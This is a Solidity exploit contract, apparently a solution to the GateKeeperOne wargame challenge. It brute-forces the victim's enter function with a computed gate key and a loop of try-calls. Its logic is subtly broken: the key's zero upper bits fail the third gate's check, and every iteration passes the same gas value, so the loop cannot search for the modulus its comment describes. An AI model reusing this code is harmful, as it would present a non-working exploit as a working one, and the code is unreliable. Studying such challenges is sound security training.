// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GateKeeperOne/GateKeeperOne.sol";

contract GateKeeperOneExploit {
    GateKeeperOne victim;
    address public owner;

    constructor(address _victim) {
        victim = GateKeeperOne(payable(_victim));
        owner = msg.sender;
    }

    function hack() public {
        uint64 gateKey = uint64(uint16(uint160(tx.origin)));
        // Ensure gateThree conditions are met
        // gateKey's lower 32 bits equal lower 16 bits of tx.origin and not equal to gateKey itself
        // Also, gateTwo requires gasleft() % 8191 == 0
        // We use a loop to find the right gas
        for(uint i = 0; i < 1000; i++) {
            try this.tryEnter{gas: 800000}(bytes8(gateKey)) {
                break;
            } catch {}
        }
    }

    function tryEnter(bytes8 _gateKey) public {
        victim.enter(_gateKey);
    }

    receive() external payable {}
}